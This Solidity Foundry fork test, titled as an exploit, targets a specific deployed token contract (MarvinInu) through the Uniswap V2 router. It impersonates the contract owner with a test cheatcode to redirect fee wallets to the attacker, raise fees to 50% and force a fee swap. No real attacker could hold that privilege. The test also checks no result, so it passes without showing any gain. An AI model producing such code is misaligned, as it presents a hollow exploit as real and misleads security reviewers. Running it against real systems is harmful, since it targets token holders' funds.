// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for IUniswapV2Router02
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// ERC20 interface for token approvals
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

// Interface for MarvinInu to call specific functions
interface IMarvinInu {
    function owner() external view returns (address);
    function updateMarketingWallet(address newMarketingWallet) external;
    function enableTrading() external;
    function swapTokensAtAmount() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function updateSwapTokensAtAmount(uint256 amount) external;
    function updateDevWallet(address newDevWallet) external;
    function updateBuyFees(uint256 marketingFee, uint256 liquidityFee, uint256 devFee) external;
    function updateSellFees(uint256 marketingFee, uint256 liquidityFee, uint256 devFee) external;
    function removeLimits() external;
    function disableTransferDelay() external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x55a380d134d722006A5CE2d510562e1239D225B1;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for fork test
        // The test file already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner
        address owner = IMarvinInu(TARGET).owner();

        // Start prank as owner
        vm.startPrank(owner);

        // 1. Set swapTokensAtAmount to minimum (0.001% of total supply)
        // totalSupply = 1e12 * 1e18 = 1e30
        // 0.001% = 1e30 * 1 / 100000 = 1e25
        IMarvinInu(TARGET).updateSwapTokensAtAmount(1e25);

        // 2. Set both marketing and dev wallets to our address
        IMarvinInu(TARGET).updateMarketingWallet(attacker);
        IMarvinInu(TARGET).updateDevWallet(attacker);

        // 3. Set fees to maximum 50% (all to marketing for simplicity)
        // Buy fees: 50% marketing, 0% liquidity, 0% dev
        IMarvinInu(TARGET).updateBuyFees(50, 0, 0);
        // Sell fees: 50% marketing, 0% liquidity, 0% dev
        IMarvinInu(TARGET).updateSellFees(50, 0, 0);

        // 4. Enable trading
        IMarvinInu(TARGET).enableTrading();

        // 5. Remove limits for easier trading
        IMarvinInu(TARGET).removeLimits();
        IMarvinInu(TARGET).disableTransferDelay();

        vm.stopPrank();

        // Now buy a small amount of tokens to generate fees
        // Get router and WETH
        IUniswapV2Router02 router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address weth = router.WETH();

        // Record initial ETH balance
        uint256 initialBalance = address(this).balance;

        // Buy path: WETH -> MARVIN
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        // Buy with minimal ETH - just enough to generate fees that exceed swapTokensAtAmount
        // We need to calculate: fee = amount * 50% = amount/2
        // The fee in tokens needs to be >= swapTokensAtAmount = 1e25
        // So amount needs to be >= 2e25 tokens
        // But token price? We'll try with 0.1 ETH and see
        vm.startPrank(attacker);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 0.1 ether}(
            0, // accept any amount
            path,
            attacker,
            block.timestamp
        );
        vm.stopPrank();

        // The contract should now have fee tokens >= swapTokensAtAmount
        // swapBack should trigger automatically on next transfer
        // Let's trigger it by transferring tokens
        vm.startPrank(attacker);
        // Transfer some tokens to ourselves to trigger swapBack
        uint256 tokenBalance = IERC20(TARGET).balanceOf(attacker);
        if (tokenBalance > 0) {
            IERC20(TARGET).transfer(attacker, 1); // Self-transfer might trigger swapBack
        }
        vm.stopPrank();

        // Check final balance
        uint256 finalBalance = address(this).balance;
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

